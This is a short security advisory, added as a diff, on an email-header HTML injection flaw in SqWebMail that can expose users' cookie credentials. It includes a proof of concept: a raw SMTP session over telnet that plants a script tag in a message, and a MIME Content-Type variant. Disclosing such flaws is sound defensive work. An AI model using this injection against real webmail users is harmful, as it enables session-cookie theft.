@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/10588/info
+
+SqWebMail is reported to be prone to an email header HTML injection vulnerability. This issue presents itself due to a failure of the application to properly sanitize user-supplied email header strings.
+
+The problem presents itself when an unsuspecting user views an email message containing malicious HTML and script code in the email header. 
+
+An attacker can exploit this issue to gain access to an unsuspecting user's cookie based authentication credentials.
+
+1) sending a raw email message with malformed headers, i.e.
+"<script>alert(document.location)</script>":
+
+ashanti@dns:~$ telnet localhost 25
+Trying x.x.x.x...
+Connected to x.x.x.x.
+Escape character is '^]'.
+220 x.x.x.x ESMTP
+helo foo
+250 x.x.x.x
+mail from:<test@test.com>
+250 ok
+rcpt to:<user@mediaservice.net>
+250 ok
+data
+354 go ahead
+<script>alert(document.location)</script>
+.
+[...]
+
+2) sending a raw email message with the MIME Content-Type header set to
+"message/delivery-status" with malformed content (see 1 above).
